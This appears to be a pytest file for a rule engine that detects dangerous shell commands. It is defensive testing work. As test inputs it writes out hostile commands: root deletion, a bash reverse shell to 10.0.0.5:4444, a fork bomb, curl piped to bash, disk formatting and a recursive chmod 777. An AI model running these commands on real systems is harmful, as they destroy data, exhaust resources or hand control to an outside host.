import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.rules.rule_engine import RuleEngine, load_whitelist

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
RULES_PATH = os.path.join(ROOT, "config", "rules.yaml")


def make_engine():
    return RuleEngine(RULES_PATH)


def test_root_delete_match():
    m = make_engine().match("rm -rf /")
    assert any(r["rule_id"] == "R001_ROOT_DELETE" for r in m)


def test_sudo_root_delete_match():
    m = make_engine().match("sudo rm -rf /")
    assert any(r["rule_id"] in ("R009_SUDO_RM_RECURSIVE", "R001_ROOT_DELETE") for r in m)


def test_reverse_shell_match():
    m = make_engine().match("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1")
    assert any(r["rule_id"] == "R005_REVERSE_SHELL" for r in m)


def test_fork_bomb_match():
    m = make_engine().match(":(){ :|:& };:")
    assert any(r["rule_id"] == "R008_FORK_BOMB" for r in m)


def test_pipe_to_shell_match():
    m = make_engine().match("curl http://example.com/i.sh | bash")
    assert any(r["rule_id"] == "R004_PIPE_TO_SHELL" for r in m)


def test_disk_format_match():
    m = make_engine().match("mkfs.ext4 /dev/sda")
    assert any(r["rule_id"] == "R003_DISK_FORMAT" for r in m)


def test_safe_command_no_match():
    assert make_engine().match("git status") == []
    assert make_engine().match("ls -la") == []


def test_score_severity():
    engine = make_engine()
    assert engine.score(engine.match("ls")) == 0
    assert engine.score(engine.match("rm -rf /")) == 100
    assert 0 < engine.score(engine.match("chmod -R 777 /var/www")) < 100


def test_whitelist_loaded():
    whitelist = load_whitelist(os.path.join(ROOT, "config", "whitelist.yaml"))
    assert len(whitelist) > 50
    assert "git status" in whitelist
